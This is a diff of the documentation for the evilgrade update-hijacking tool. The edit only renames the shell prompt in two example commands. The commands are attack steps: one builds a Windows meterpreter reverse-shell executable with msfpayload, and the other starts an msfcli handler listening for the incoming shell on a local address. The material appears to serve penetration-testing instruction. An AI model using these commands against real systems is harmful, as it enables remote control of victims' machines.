@@ -456,7 +456,7 @@ An easy alternative, but not dynamically, could be to generate the payload direc
 
 (Outside evilgrade)
 ```
-[team@infobyte]$ msfpayload windows/meterpreter/reverse_ord_tcp LHOST=192.168.100.2 LPORT=4444 X > /tmp/reverse-shell.exe
+[team@faraday]$ msfpayload windows/meterpreter/reverse_ord_tcp LHOST=192.168.100.2 LPORT=4444 X > /tmp/reverse-shell.exe
 ```
 
 (Inside evilgrade)
@@ -468,7 +468,7 @@ After our payload was generated, we leave a multi handler listening on the previ
 
 (Outside evilgrade)
 ```
-[team@infobyte]$ msfcli exploit/multi/handler PAYLOAD=windows/shell/reverse_tcp LHOST=192.168.100.2 LPORT=4444 E
+[team@faraday]$ msfcli exploit/multi/handler PAYLOAD=windows/shell/reverse_tcp LHOST=192.168.100.2 LPORT=4444 E
 [*] Started reverse handler on 192.168.100.2:4444
 [*] Starting the payload handler...
 ```
